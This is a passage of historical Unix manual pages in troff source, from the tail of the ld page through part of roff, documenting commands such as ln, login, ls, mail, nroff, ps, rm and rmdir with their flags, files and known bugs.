reference are loaded.
If a routine from a library
references another routine in the library,
the referenced routine must appear after the
referencing routine in the library.
Thus the order of programs within libraries
is important.
.s3
.it Ld
understands several flag arguments which are written
preceded by a `\*-'.
Except for \fB\*-l\fR,
they should appear before the file names.
.s3
.lp +4 4
\fB\*-s\fR	`squash' the output, that is, remove the symbol table
and relocation bits to save space (but impair the
usefulness of the debugger).
This information can also be removed by
.it strip.
.s3
.lp +4 4
\fB\*-u\fR	take the following argument as a symbol and enter
it as undefined in the symbol table.  This is useful
for loading wholly from a library, since initially the symbol
table is empty and an unresolved reference is needed
to force the loading of the first routine.
.s3
.lp +4 4
\fB\*-l\fR	This
option is an abbreviation for a library name.
\fB\*-l\fR
alone stands for `/lib/liba.a', which
is the standard system library for assembly language
programs.
\fB\*-l\fIx\fR
stands for `/lib/lib\fIx\fR.a' where \fIx\fR is any character.
A library is searched when its name is encountered,
so the placement of a \fB\*-l\fR
is significant.
.s3
.lp +4 4
\fB\*-x\fR	do not preserve local
(non-.globl) symbols in the output symbol table; only enter
external symbols.
This option saves some space in the output file.
.s3
.lp +4 4
\fB\*-X\fR	Save local symbols
except for those whose names begin with `L'.
This option is used by
.it cc
to discard internally generated labels while
retaining symbols local to routines.
.s3
.lp +4 4
\fB\*-r\fR	generate relocation bits in the output file
so that it can be the subject of another
.it ld
run.
This flag also prevents final definitions from being
given to common symbols,
and suppresses the `undefined symbol' diagnostics.
.s3
.lp +4 4
\fB\*-d\fR	force definition of common storage
even if the
.bd \*-r
flag is present.
.s3
.lp +4 4
\fB\*-n\fR	Arrange that
when the output file is executed,
the text portion will be read-only and shared
among all users executing the file.
This involves moving the data areas up the the first
possible 4K word boundary following the
end of the text.
.s3
.lp +4 4
\fB\*-i\fR	When the output file is executed, the program
text and data areas will live in separate address spaces.
The only difference between this option
and
.bd \-n
is that here the data starts at location 0.
.i0
.dt
.sh FILES
/lib/lib?.a   libraries
.br
a.out   output file
.sh "SEE ALSO"
as (I), ar (I)
.sh BUGS
-- /usr/man/man1/ln.1 mode=0100664 uid=3 gid=3 atime=170022141 mtime=173061342 --
.th LN I 3/15/72
.sh NAME
ln  \*-  make a link
.sh SYNOPSIS
.bd ln
name1 [ name2 ]
.sh DESCRIPTION
A link is a directory entry referring
to a file; the same file (together with
its size, all its protection
information, etc)
may have several links to it.
There is no way to distinguish a link to a file
from its original directory entry;
any changes in the
file are effective
independently of the name by which the file is known.
.s3
.it Ln
creates a link to an existing file
.it name1.
If
.it name2
is given, the link has that name;
otherwise it is placed in the current directory
and its name is the last component
of
.it name1.
.s3
It is forbidden to link to a directory
or to link across file systems.
.sh "SEE ALSO"
rm (I)
.sh BUGS
There is nothing particularly
wrong with
.it ln,
but
.it tp
doesn't understand about links and makes one copy for
each name by which a file is known;
thus if the tape is extracted
several copies are restored and the information that links were involved
is lost.
-- /usr/man/man1/login.1 mode=0100664 uid=3 gid=3 atime=170022142 mtime=173061342 --
.th LOGIN I 3/15/72
.sh NAME
login  \*-  sign onto UNIX
.sh SYNOPSIS
.bd login
[ username ]
.sh DESCRIPTION
The
.it login
command
is used when a user initially
signs onto UNIX, or it may be used at any time to change
from one user to another.
The latter case is the one summarized above and
described here.
See `How to Get Started' for how to dial up initially.
.s3
If
.it login
is invoked without an argument,
it asks for a user name, and, if
appropriate, a password.
Echoing is turned off (if possible) during the typing of the password,
so it will not appear on the written record of the
session.
.s3
After a successful login,
accounting files are updated and
the user is informed of the
existence of
.it .mail
and message-of-the-day files.
.it Login
initializes the user and group IDs and the working directory,
then executes a command interpreter (usually
.it sh
(I)) according to specifications found in a password file.
.s3
Login is recognized by the Shell
and executed directly (without forking).
.sh FILES
/etc/utmp	accounting
.br
/usr/adm/wtmp	accounting
.br
.li
.mail		mail
.br
/etc/motd	message-of-the-day
.br
/etc/passwd	password file
.sh "SEE ALSO"
init (VIII), getty (VIII), mail (I), passwd (I), passwd (V)
.sh DIAGNOSTICS
`login incorrect,'
if the name or the password is bad.
`No Shell,', `cannot open password file,' `no directory':
consult a UNIX programming counselor.
.sh BUGS
-- /usr/man/man1/ls.1 mode=0100664 uid=3 gid=3 atime=170022143 mtime=173061342 --
.th LS I 3/20/74
.sh NAME
ls  \*-  list contents of directory
.sh SYNOPSIS
.bd ls
[
.bd \*-ltasdruifg
] name ...
.sh DESCRIPTION
For each directory argument,
.it ls
lists the contents of the directory;
for each file argument,
.it ls
repeats its name and any other information requested.
The output is sorted alphabetically by default.
When no argument is given, the current directory is listed.
When several arguments are given,
the arguments are first sorted appropriately,
but file arguments appear
before directories and their contents.
There are several options:
.s3
.lp +4 4
\fB\*-l\fR	list in long format, giving mode, number of links, owner,
size in bytes, and time of last modification
for each file.
(See below.)
If the file is a special file the size field will instead contain
the major and minor device numbers.
.s3
.lp +4 4
\fB\*-t\fR	sort by time modified (latest first) instead of
by name, as is normal
.s3
.lp +4 4
\fB\*-a\fR	list all entries; usually those beginning with `\fB.\fR' are
suppressed
.s3
.lp +4 4
\fB\*-s\fR	give size in blocks for each entry
.s3
.lp +4 4
\fB\*-d\fR	if argument is a directory, list only its name, not
its contents (mostly used with
.bd \*-l
to get status
on directory)
.s3
.lp +4 4
\fB\*-r\fR	reverse the order of sort to get reverse alphabetic
or oldest first as appropriate
.s3
.lp +4 4
\fB\*-u\fR	use time of last access instead of last
modification for sorting (\fB\*-t\fR) or printing
(\fB\*-l\fR)
.s3
.lp +4 4
\fB\*-i\fR	print i-number in first column
of the report for each file listed
.s3
.lp +4 4
\fB\*-f\fR	force each argument to be interpreted as a directory
and list the name found in each slot.
This option turns off
.bd "\*-l, \*-t, \*-s,"
and
.bd \*-r,
and
turns on
.bd \*-a;
the order is the order in which entries
appear in the directory.
.s3
.lp +4 4
\fB\-g\fR	Give group ID instead of owner ID in long listing.
.s3
.i0
The mode printed under the
.bd \*-l
option contains 11 characters
which are interpreted
as follows:
the first character is
.s3
.lp +3 3
\fBd\fR	if the entry is a directory;
.lp +3 3
\fBb\fR	if the entry is a block-type special file;
.lp +3 3
\fBc\fR	if the entry is a character-type special file;
.lp +3 3
\fB\*-\fR	if the entry is a plain file.
.s3
.i0
The next 9 characters are interpreted
as three sets of three bits each.
The first set refers to owner permissions;
the next to permissions to others in the same user-group;
and the last to all others.
Within each set the three characters indicate
permission respectively to read, to write, or to
execute the file as a program.
For a directory, `execute' permission is interpreted
to mean permission to search the directory
for a specified file.
The permissions are indicated as follows:
.s3
.lp +3 3
\fBr\fR	if the file is readable
.lp +3 3
\fBw\fR	if the file is writable
.lp +3 3
\fBx\fR	if the file is executable
.lp +3 3
\fB\*-\fR	if the indicated permission is not granted
.s3
.i0
The group-execute permission character is given
as
.bd s
if the file has set-group-ID mode;
likewise the user-execute permission character is given
as
.bd s
if the file has set-user-ID mode.
.s3
The last character of the mode is normally blank but is printed as
``t'' if the 1000 bit of the mode is on.
See
.it "chmod (I)"
for the current meaning of this mode.
.sh FILES
/etc/passwd to get user ID's for
\fBls \*-l\fR.
.sh BUGS
-- /usr/man/man1/mail.1 mode=0100664 uid=3 gid=3 atime=170022147 mtime=173061353 --
.th MAIL I 2/21/75
.sh NAME
mail  \*-  send mail to designated users
.sh SYNOPSIS
.bd mail
[
.bd \-yn
]
[ person ... ]
.sh DESCRIPTION
.it Mail
with no argument
searches for a file
called
.it .mail,
prints it if it is nonempty,
then asks if it should be saved.
If the answer
is
.bd y,
the mail is added to
.it mbox.
Finally
.it .mail
is truncated to zero length.
To leave the mailbox untouched,
hit `delete.'
The question can be answered on the command line
with the argument `\-y' or `\-n'.
.s3
When
.it persons
are named,
.it mail
takes the standard input up to an end of file
and adds it to each
.it person's
.it .mail
file.
The message is preceded by the sender's name and a postmark.
.s3
A
.it person
is either
a user name recognized by
.it login
(I),
in which case the mail
is sent to the default working directory of that user;
or the path name of a directory,
in which case
.it .mail
in that directory is used.
.s3
When a user logs in he is informed of the presence
of mail.
No mail will be received from a sender to whom
.it .mail
is inaccessible or unwritable.
.sh FILES
/etc/passwd	to identify sender and locate persons
.br
/etc/utmp	to identify sender
.br
.li
.mail		input mail
.br
mbox		saved mail
.br
/tmp/m#	temp file
.sh "SEE ALSO"
write (I)
.sh BUGS
-- /usr/man/man1/man.1 mode=0100664 uid=3 gid=3 atime=170022148 mtime=173061353 --
.th MAN I 8/20/73
.sh NAME
man \*- run off section of UNIX manual
.sh SYNOPSIS
.bd man
[ section ] [ title ... ]
.sh DESCRIPTION
.it Man
is a shell command file which locates
and prints one or more sections of this manual.
.it Section
is the section number of the manual,
as an Arabic not Roman numeral,
and is optional.
.it Title
is one or more section names;
these names bear a generally simple relation
to the page captions in the manual.
If the
.it section
is missing,
.bd 1
is assumed.
For example,
.s3
.bd "	man man"
.s3
would reproduce this page.
.sh FILES
/usr/man/man?/*
.sh BUGS
The manual is supposed to be reproducible either on
the phototypesetter or on a typewriter.
However, on a typewriter some information is necessarily lost.
-- /usr/man/man1/mesg.1 mode=0100664 uid=3 gid=3 atime=170022148 mtime=173061353 --
.th MESG I 3/15/72
.sh NAME
mesg  \*-  permit or deny messages
.sh SYNOPSIS
.bd mesg
[
.bd n
] [
.bd y
]
.sh DESCRIPTION
.it Mesg
with argument
.bd n
forbids messages via
.it write
by revoking non-user
write permission on the user's typewriter.
.it Mesg
with argument
.bd y
reinstates permission.
All by itself,
.it mesg
reverses the current permission.
In all cases the previous state is reported.
.sh FILES
/dev/tty?
.sh "SEE ALSO"
write (I)
.sh DIAGNOSTICS
`?' if the standard input file is not a typewriter
.sh BUGS
-- /usr/man/man1/mkdir.1 mode=0100664 uid=3 gid=3 atime=170022150 mtime=173061353 --
.th MKDIR I 3/15/72
.sh NAME
mkdir  \*-  make a directory
.sh SYNOPSIS
.bd mkdir
dirname ...
.sh DESCRIPTION
.it Mkdir
creates specified directories
in mode 777.
The standard entries `\fB.\fR' and `\fB..\fR' are made automatically.
.sh "SEE ALSO"
rmdir (I)
.sh BUGS
-- /usr/man/man1/mv.1 mode=0100664 uid=3 gid=3 atime=170022151 mtime=173061353 --
.th MV I 8/20/73
.sh NAME
mv  \*-  move or rename a file
.sh SYNOPSIS
.bd mv
name1 name2
.sh DESCRIPTION
.it Mv
changes the name of
.it name1
to
.it name2.
If
.it name2
is a directory,
.it name1
is moved to
that directory with its original file-name.
Directories may only be moved within the same parent
directory (just renamed).
.s3
If
.it name2
already exists,
it is removed before
.it name1
is renamed.
If
.it name2
has a mode which forbids writing,
.it mv
prints the mode and
reads the standard input to obtain a line;
if the line begins with
.bd y,
the move takes place;
if not,
.it mv
exits.
.s3
If
.it name2
would lie on a different file system,
so that a simple rename is impossible,
.it mv
copies the file
and deletes the original.
.sh BUGS
It should take a
.bd "\*-f"
flag, like
.it rm,
to suppress the question
if the target exists and is not writable.
-- /usr/man/man1/neqn.1 mode=0100664 uid=3 gid=3 atime=170022152 mtime=173061353 --
.th NEQN I 4/30/74
.sh NAME
neqn \*- typeset mathematics on terminal
.sh SYNOPSIS
.bd neqn
[ file ] ...
.sh DESCRIPTION
.it Neqn
is an nroff (I)
preprocessor.
The input language is the same as that of
eqn (I).
Normal usage is almost always
.s3
	neqn file ... | nroff
.s3
Output is meant for terminals with
forward and reverse capabilities, such as
the Model 37 teletype or GSI terminal.
.s3
If no arguments are specified,
.it neqn
reads the standard input,
so it may be used as a filter.
.sh "SEE ALSO"
eqn (I), gsi (VI)
.sh BUGS
Because of some interactions with 
.it nroff
there may not always be enough space left before and after
lines containing equations.
-- /usr/man/man1/newgrp.1 mode=0100664 uid=3 gid=3 atime=170022152 mtime=173061353 --
.th NEWGRP I 4/8/75
.sh NAME
newgrp \*- log in to a new group
.sh SYNOPSIS
.bd newgrp
group
.sh DESCRIPTION
.it Newgrp
changes the group identification of its caller,
analogously to
.it login.
The same person remains logged in,
and the current directory is unchanged,
but calculations of access permissions to files are
performed with respect to the
new group ID.
.s3
A password is demanded if the group has
a password and the user himself does not.
.s3
When most users log in, they
are members of the group named `other.'
.sh FILES
/etc/group, /etc/passwd
.sh "SEE ALSO"
login (I), group (V)
.sh BUGS
-- /usr/man/man1/nice.1 mode=0100664 uid=3 gid=3 atime=170022153 mtime=173061353 --
.th NICE I 2/8/75
.sh NAME
nice \*- run a command at low priority
.sh SYNOPSIS
.bd nice
[
\fB\-\fInumber\fR
]
command [ arguments ]
.sh DESCRIPTION
.it Nice
executes
.it command
with low scheduling priority.
If a numerical argument is given, that priority
(in the range 1-20) is used;
if not, priority 4 is used.
.s3
The super-user may run commands with
priority higher than normal
by using a negative priority,
e.g. `\-\-10'.
.sh "SEE ALSO"
nohup (I), nice (II)
.sh BUGS
-- /usr/man/man1/nm.1 mode=0100664 uid=3 gid=3 atime=170022153 mtime=173061353 --
.th NM I 8/20/73
.sh NAME
nm  \*-  print name list
.sh SYNOPSIS
.bd nm
[
.bd \-cnrupg
]
[ name ]
.sh DESCRIPTION
.it Nm
prints the symbol table from the output file of an
assembler or loader run.
Each symbol name is preceded by its value (blanks if undefined)
and one of the letters \fBU\fR (undefined) \fBA\fR (absolute) \fBT\fR
(text segment symbol),
\fBD\fR (data segment symbol), \fBB\fR
(bss segment symbol),
or \fBC\fR (common symbol).
If the symbol is local (non-external)
the type letter is in lower case.
The output is sorted alphabetically.
.s3
If no file is given, the symbols in
.bd a.out
are listed.
.s3
Options are:
.s3
.lp +4 4
\fB\-c\fR	list only C-style external symbols, that is
those beginning with underscore `\*_'.
.s3
.lp +4 4
\fB\-g\fR	print only global (external) symbols
.s3
.lp +4 4
\fB\-n\fR	sort by value instead of by name
.s3
.lp +4 4
\fB\-p\fR	don't sort; print in symbol-table order
.s3
.lp +4 4
\fB\-r\fR	sort in reverse order
.s3
.lp +4 4
\fB\-u\fR	print only undefined symbols.
.i0
.sh FILES
a.out
.sh BUGS
-- /usr/man/man1/nohup.1 mode=0100664 uid=3 gid=3 atime=170022154 mtime=173061353 --
.th NOHUP I 11/1/73
.sh NAME
nohup \*- run a command immune to hangups
.sh SYNOPSIS
.bd nohup
command [ arguments ]
.sh DESCRIPTION
.it Nohup
executes
.it command
with hangups,
quits and interrupts all ignored.
.sh "SEE ALSO"
nice (I), signal (II)
.sh BUGS
-- /usr/man/man1/nroff.1 mode=0100664 uid=3 gid=3 atime=170022155 mtime=173061353 --
.tc |
.tr |
.de x
.in \\n(inu
.if t .ta \\$2
.if n .ta \\$2+1
.in \\$1
.ti -\\$2
\fB\\$3\fP\t\\
..
.th NROFF I 4/15/75
.sh NAME
nroff  \*-  format text
.sh SYNOPSIS
.bd nroff
[
\fB+\fIn\fR
] [
\fB\*-\fIn\fR
] [
\fB\-n\fIn\fR
] [
\fB\-r\fIan\fR
] [
\fB\-m\fIx\fR
] [
.bd \*-s
] [
.bd \*-h
] [
.bd \*-q
] files
.sh DESCRIPTION
.it Nroff
formats text according to control lines embedded
in the text files.
.it Nroff
reads the standard input if
no file
arguments are given.
An argument of just ``\-'' refers to the standard input.
The non-file option arguments are interpreted as follows:
.s3
.lp +10 10
\fB+\fIn\fR	Output commences at the first page whose page
number is
.it n
or larger.
.s3
.lp +10 10
\fB\*-\fIn\fR	Printing
stops after page
.it n.
.s3
.lp +10 10
\fB\-n\fIn\fR	First generated (not necessarily printed)
page is given number \fIn\fR;
simulates ``.pn|\fIn\fR''.
.s3
.lp +10 10
\fB\-r\fIan\fR	Set number
register to the value
.it n.
.s3
.lp +10 10
\fB\-m\fIname\fR	Prepends a standard macro file;
simulates ``.so /usr/lib/tmac.\fIname\fR''.
.s3
.lp +10 10
\fB\*-s\fR	Stop prior to
each page to permit paper
loading.
Printing is restarted by
typing a `newline' character.
.s3
.lp +10 10
\fB\*-h\fR	Spaces
are replaced where possible
with
tabs to speed up output (or reduce
the size of the output file).
.s3
.lp +10 10
\fB\*-q\fR	Prompt
names for insertions are not printed
and the bell character is sent instead;
the insertion is not echoed.
.s3
.lp +10 10
.br
.i0
.sh FILES
.dt
/usr/lib/suftab	suffix hyphenation tables
.br
/tmp/rtm?	temporary
.br
/usr/lib/tmac.*	standard macro files
.br
.sh "SEE ALSO"
NROFF User's Manual
(internal memorandum).
.br
neqn (I),
col (I)
.sh BUGS
-- /usr/man/man1/od.1 mode=0100664 uid=3 gid=3 atime=170022155 mtime=173061353 --
.th OD I 1/15/73
.sh NAME
od  \*-  octal dump
.sh SYNOPSIS
.bd od
[
.bd \*-abcdho
] [ file ] [ [
.bd +
] offset[ \fB. \fR][ \fBb\fR ] ]
.sh DESCRIPTION
.it Od
dumps
.it file
in
one or more formats
as
selected by the first argument.
If the first argument is missing
.bd \*-o
is default.
The meanings of the format argument characters
are:
.s3
.lp +3 3
\fBa\fR	interprets words as PDP-11 instructions and
dis-assembles the operation code.
Unknown operation codes print as ???.
.s3
.lp +3 3
\fBb\fR	interprets bytes in octal.
.s3
.lp +3 3
\fBc\fR	interprets bytes in ascii.
Unknown ascii characters are printed as \\?.
.s3
.lp +3 3
\fBd\fR	interprets words in decimal.
.s3
.lp +3 3
\fBh\fR	interprets words in hex.
.s3
.lp +3 3
\fBo\fR	interprets words in octal.
.s3
.s3
.i0
The \fIfile\fR argument specifies which file is to be dumped.
If no file argument is specified,
the standard input is used.
Thus
.it od
can be used as a filter.
.s3
The offset argument specifies the offset
in the file where dumping is to commence.
This argument is normally interpreted
as octal bytes.
If `\fB.\fR' is appended, the offset is interpreted in
decimal.
If `\fBb\fR' is appended, the offset is interpreted in blocks.
(A block is 512 bytes.)
If the file argument is omitted,
the offset argument must be preceded by `\fB+\fR'.
.s3
Dumping continues until end-of-file.
.sh "SEE ALSO"
db (I)
.sh BUGS
-- /usr/man/man1/opr.1 mode=0100664 uid=3 gid=3 atime=170022157 mtime=173061353 --
.th OPR I 7/17/74
.sh NAME
opr \*- off line print
.sh SYNOPSIS
.bd opr
[ \fB\*-\fRdestination ]
[ 
.bd \*-crm
]
[ name ... ]
.sh DESCRIPTION
.it Opr
causes the named files to be printed off line at the specified destination.
If no names appear the standard input is assumed.
.s3
At the mother system
the following destinations are recognized.
The default destination is 
.bd mh.
.s3
.lp +4 4
\fBlp\fR	Local line printer.
.s3
.lp +4 4
\fBmh\fR	GCOS at Murray Hill Comp Center.
GCOS identification must be registered in
the UNIX password file (see
passwd (V)).
.s3
.lp +4 4
\fBsp\fR	Spider network printer.
.s3
.lp +4 4
\fIxx\fR	The two-character code 
.it xx
is taken to be a Murray Hill GCOS station id.
Useful codes are `r1' for quality print
and `q1' for quality print with special ribbon.
.i0
.s3
.it Opr
uses spooling daemons that do the job
when facilities become available.
Flag
.bd \*-r
causes the named files to be removed
when spooled.
Flag
.bd \*-c
causes copies to be made so as to insulate
the daemons from any intervening changes to the files.
.s3
Flag
.bd \*-m
causes mail to be sent
when UNIX is finished transmitting the file.
For GCOS jobs
the mail includes the snumb.
.sh FILES
.nf
.if t .ta 1.2i
.if n .ta 14
/etc/passwd	personal ident cards
/lib/dpr	dataphone spooler
/etc/dpd	dataphone daemon
/usr/dpd/*	spool area
/lib/lpr	line printer spooler
/etc/lpd	line printer daemon
/usr/lpd/*	spool area
/lib/npr	spider network spooler
.fi
.fi
.sh "SEE ALSO"
fsend (I), dpd (VIII), lpd (VIII)
.sh BUGS
Line printer spooler doesn't handle flags.
.br
Spider network spooler doesn't spool.
-- /usr/man/man1/passwd.1 mode=0100664 uid=3 gid=3 atime=170022158 mtime=173061353 --
.th PASSWD I 9/1/72
.sh NAME
passwd \*- change login password
.sh SYNOPSIS
.bd passwd
name password
.sh DESCRIPTION
The
.it password
becomes associated with the given login name.
This can only be done by corresponding user
or by the super-user.
An explicit null argument ("") for the password
argument removes
any password.
.sh FILES
/etc/passwd
.sh "SEE ALSO"
login (I), passwd (V), crypt (III)
.sh BUGS
-- /usr/man/man1/pfe.1 mode=0100664 uid=3 gid=3 atime=170022160 mtime=173061353 --
.th PFE I 11/1/73
.sh NAME
pfe \*- print floating exception
.sh SYNOPSIS
.bd pfe
.sh DESCRIPTION
.it Pfe
examines the floating point exception register and
prints a diagnostic for the last
floating point exception.
.sh "SEE ALSO"
signal (II)
.sh BUGS
Since the system does not save the exception register
in a core image file,
the message
refers to the last error encountered by anyone.
Floating exceptions are therefore volatile.
-- /usr/man/man1/pr.1 mode=0100664 uid=3 gid=3 atime=170022163 mtime=173061353 --
.th PR I 3/20/74
.sh NAME
pr  \*-  print file
.sh SYNOPSIS
.bd pr
[
.bd \*-h
.it header
] [ \fB\*-\fIn\fR ] [ \fB+\fIn\fR ]
[ \fB\*-w\fIn\fR ] [ \fB\*-l\fIn\fR ] [ \fB\*-t\fR ] [
.bd \*-s\fIc\fB
] [
.bd \*-m
]
name
.li
. . .
.sh DESCRIPTION
.it Pr
produces a printed listing of one or more files.
The output is separated into pages headed by a date,
the name of the file or a specified header, and the page number.
If there are no file arguments,
.it pr
prints its standard
input, and is thus usable as a filter.
.s3
Options apply to all following files but may be reset
between files:
.s3
.lp +5 5
\fB\*-\fIn\fR	produce \fIn\fR-column output
.s3
.lp +5 5
\fB+\fIn\fR	begin printing with page \fIn\fR
.s3
.lp +5 5
\fB\*-h\fR	treat the next argument as a header to be used instead of the file name
.s3
.lp +5 5
\fB\*-w\fIn\fR	for purposes of multi-column output,
take the width of the page to be
.it n
characters instead of the default 72
.s3
.lp +5 5
\fB\*-l\fIn\fR	take the length of the page to be
.it n
lines instead of the default 66
.s3
.lp +5 5
\fB\*-t\fR	do not print the 5-line header or the
5-line trailer normally supplied for each page
.s3
.lp +5 5
\fB\*-s\fIc\fR	separate columns by the single character
.it c
instead of by the appropriate amount of white space.
A missing
.it c
is taken to be a tab.
.s3
.lp +5 5
\fB\*-m\fR	print all files simultaneously,
each in one column
.s3
.i0
Interconsole messages via write(I) are
forbidden during a
.it pr.
.sh FILES
/dev/tty?
to suspend messages.
.sh "SEE ALSO"
cat (I), cp (I)
.sh DIAGNOSTICS
none; files not found are ignored
.sh BUGS
-- /usr/man/man1/prof.1 mode=0100664 uid=3 gid=3 atime=170022164 mtime=173061353 --
.th PROF I 3/12/73
.sh NAME
prof \*- display profile data
.sh SYNOPSIS
.bd prof
[
.bd \*-v
] [
.bd \*-a
] [
.bd \*-l
] [ file ]
.sh DESCRIPTION
.it Prof
interprets the file
.it mon.out
produced by the
.it monitor
subroutine.
Under default modes,
the symbol table in the
named object file
.it (a.out
default)
is read and correlated with the
.it mon.out
profile file.
For each external symbol, the percentage
of time spent executing between that symbol
and the next
is printed (in decreasing order),
together with the number of times that routine was called
and the number of milliseconds per call.
.s3
If the
.bd \*-a
option is used,
all symbols are reported rather than
just external symbols.
If the
.bd \*-l
option
is used,
the output is listed by
symbol value rather than
decreasing percentage.
If the
.bd \*-v
option is used,
all printing is suppressed
and a profile plot is produced
on the 611 display.
.s3
In order for the number of calls to a routine to be tallied,
the
.bd \*-p
option of
.it cc
must have been given when the file containing the
routine was compiled.
This option also arranges for the
.it mon.out
file to be produced automatically.
.sh FILES
mon.out	for profile
.br
a.out		for namelist
.br
/dev/vt0	for plotting
.sh "SEE ALSO"
monitor (III), profil (II), cc (I)
.sh BUGS
Beware of quantization errors.
-- /usr/man/man1/ps.1 mode=0100664 uid=3 gid=3 atime=170022166 mtime=173061353 --
.th PS I 3/20/74
.sh NAME
ps \*- process status
.sh SYNOPSIS
.bd ps
[
.bd aklx
]
[ namelist ]
.sh DESCRIPTION
.it Ps
prints certain indicia about active
processes.
The
.bd a
flag asks for information about all processes with typewriters (ordinarily
only one's own processes are displayed);
.bd x
asks even about processes with no typewriter;
.bd l
asks for a long listing.
Ordinarily only the typewriter number (if not one's own),
the process number,
and an approximation to the command line are given.
If the
.bd k
flag is specified,
the file
.it /usr/sys/core
is used in place of
.it /dev/mem.
This is used for
postmortem system debugging.
If a second argument is given,
it is taken to be the file containing the system's namelist.
.s3
The long listing is columnar and contains
.s3
.lp +5 0
The name of the process's control typewriter.
.s3
.lp +5 0
Flags associated with the process.
01: in core;
02: system process;
04: locked in code (e.g. for physical I/O);
10: being swapped;
20: being traced by another process.
.s3
.lp +5 0
The state of the process.
0: nonexistent;
S: sleeping;
W: waiting;
R: running;
Z: terminated;
T: stopped.
.s3
The user ID of the process owner.
.s3
The process ID of the process; as in certain cults it is possible to kill a process
if you know its true name.
.s3
The priority of the
process; high numbers mean low priority.
.s3
The size in blocks of the core image of the process.
.s3
The event for which the process is waiting or sleeping;
if blank, the process is running.
.s3
The command and its arguments.
.s3
.i0
.dt
.it Ps
makes an educated guess as to the file name
and arguments given when the process was created
by examining core memory or the swap area.
The method is inherently somewhat unreliable and in any event
a process is entitled to destroy this information,
so the names cannot be counted on too much.
.sh FILES
/unix		system namelist
.br
/dev/mem	core memory
.br
/usr/sys/core	alternate core file
.br
/dev	searched to find swap device and typewriter names
.sh "SEE ALSO"
kill (I)
.sh BUGS
-- /usr/man/man1/pwd.1 mode=0100664 uid=3 gid=3 atime=170022167 mtime=173061353 --
.th PWD I 5/15/74
.sh NAME
pwd \*- working directory name
.sh SYNOPSIS
.bd pwd
.sh DESCRIPTION
.it Pwd
prints the pathname of the working (current) directory.
.sh "SEE ALSO"
chdir (I)
.sh BUGS
-- /usr/man/man1/rc.1 mode=0100664 uid=3 gid=3 atime=170022168 mtime=173061353 --
.th RC I 5/15/74
.sh NAME
rc \*- Ratfor compiler
.sh SYNOPSIS
.bd rc
[
.bd \*-c
] [
.bd \*-r
] [
.bd \*-f
] [
.bd \*-v
] file ...
.sh DESCRIPTION
.it Rc
invokes the Ratfor preprocessor on a set of Ratfor source files.
It accepts three types of arguments:
.s3
Arguments whose names end with `.r' are taken to be
Ratfor source programs; they are 
preprocessed into Fortran and compiled.
Each subroutine or function `name' is placed on a separate file
.it name.f,
and its object code is left on
.it name.o.
The main routine is on
.it MAIN.f
and
.it MAIN.o;
block data subprograms go on
.it blockdata?.f
and
.it blockdata?.o.
The files resulting from a `.r' file are
loaded into a single object file
.it file.o,
and the intermediate object and Fortran files are removed.
.s3
The following flags are interpreted by
.it rc.
See
.it "ld (I)"
for load-time flags.
.s3
.lp +6 5
\fB\*-c\fR	Suppresses the loading phase of the compilation,
as does any error in anything.
.s3
.lp +6 5
\fB\*-f\fR	Save Fortran intermediate files.
This is primarily for debugging.
.s3
.lp +6 5
\fB\*-r\fR	Ratfor only; don't try to compile the Fortran.
This implies
.bd \*-f
and
.bd \*-c.
.s3
.lp +6 5
\fB\*-v\fR	Don't list intermediate file names while compiling.
.i0
.dt
.s3
Arguments whose names end with `.f' are taken to be
Fortran source programs;
they are compiled in the normal manner.
(Only one Fortran routine is allowed in a `.f' file.)
Other arguments
are taken
to be either loader flag arguments, or Fortran-compatible
object programs, typically produced by an earlier
.it rc
run,
or perhaps libraries of Fortran-compatible routines.
These programs, together with the results of any
compilations specified, are loaded
to produce an executable program with name
.bd a.out.
.i0
.sh FILES
ratjunk		temporary
.br
/usr/bin/ratfor	preprocessor
.br
/usr/fort/fc1	Fortran compiler
.sh "SEE ALSO"
``RATFOR \*- A Rational Fortran''.
.br
fc(I) for Fortran error messages.
.sh DIAGNOSTICS
Yes, both from
.it rc
itself and from Fortran.
.sh BUGS
Limit of about 50 arguments, 10 block data files.
.s3
#define and #include lines in
``.f'' files are not processed.
-- /usr/man/man1/rev.1 mode=0100664 uid=3 gid=3 atime=170022169 mtime=173061354 --
.th REV I 4/24/75
.sh NAME
rev \*- reverse lines of a file
.sh SYNOPSIS
.bd rev
.sh DESCRIPTION
.it Rev
copies the standard input to the standard output,
reversing the order of characters in every line.
.sh BUGS
-- /usr/man/man1/rm.1 mode=0100664 uid=3 gid=3 atime=170022172 mtime=173061354 --
.th RM I 1/20/73
.sh NAME
rm  \*- remove (unlink) files
.sh SYNOPSIS
.bd rm
[
.bd \*-f
] [
.bd \*-r
] name ...
.sh DESCRIPTION
.it Rm
removes the entries for one or more files from a directory.
If an entry was the last link to the file, the file
is destroyed.
Removal of a file requires write permission in its directory,
but neither read nor write permission on the file itself.
.s3
If a file has no write permission,
.it rm
prints the file name and its mode, then
reads a line from the standard input.
If the line begins with \fBy\fR, the file is removed,
otherwise it is not.
The question is not asked if
option
.bd \-f
was given or if the standard input is not a typewriter.
.s3
If a designated file is a directory,
an error comment is printed unless the optional
argument
.bd \*-r
has been used.
In that case,
.it rm
recursively deletes the
entire contents of the specified directory.
To remove directories \fIper se\fR see rmdir(I).
.sh FILES
/etc/glob to implement the
.bd \*-r
flag
.sh "SEE ALSO"
rmdir (I)
.sh BUGS
When
.it rm
removes the contents of a directory under the
.bd \*-r
flag, full pathnames are not printed in diagnostics.
-- /usr/man/man1/rmdir.1 mode=0100664 uid=3 gid=3 atime=170022175 mtime=173061354 --
.th RMDIR I 3/15/72
.sh NAME
rmdir  \*-  remove directory
.sh SYNOPSIS
.bd rmdir
dir ...
.sh DESCRIPTION
.it Rmdir
removes (deletes) directories.
The directory must be empty (except for the standard entries
`\fB.\fR' and `\fB..\fR', which
.it rmdir
itself removes).
Write permission is required in the
directory in which the directory to be removed appears.
.sh BUGS
Needs a \fB\*-r\fR flag.
.br
Actually, write permission in the
directory's parent is
.it not
required.
.br
Mildly unpleasant consequences
can follow removal of your own or someone else's current directory.
-- /usr/man/man1/roff.1 mode=0110664 uid=3 gid=3 atime=170022178 mtime=173061354 --
.th ROFF I 11/4/74
.sh NAME
roff  \*-  format text
.sh SYNOPSIS
.bd roff
[ \fB+\fIn\fR ] [ \fB\*-\fIn\fR ] [
.bd \*-s
] [
.bd \*-h
] file ...
.sh DESCRIPTION
.it Roff
formats text according to control lines embedded
in the text in the given files.
Encountering a nonexistent file terminates printing.
Incoming interconsole messages are turned off during printing.
The optional flag arguments mean:
.s3
.lp +5 5
\fB+\fIn\fR	Start printing at the first page with number \fIn\fR.
.s3
.lp +5 5
\fB\*-\fIn\fR	Stop printing at the first page numbered higher
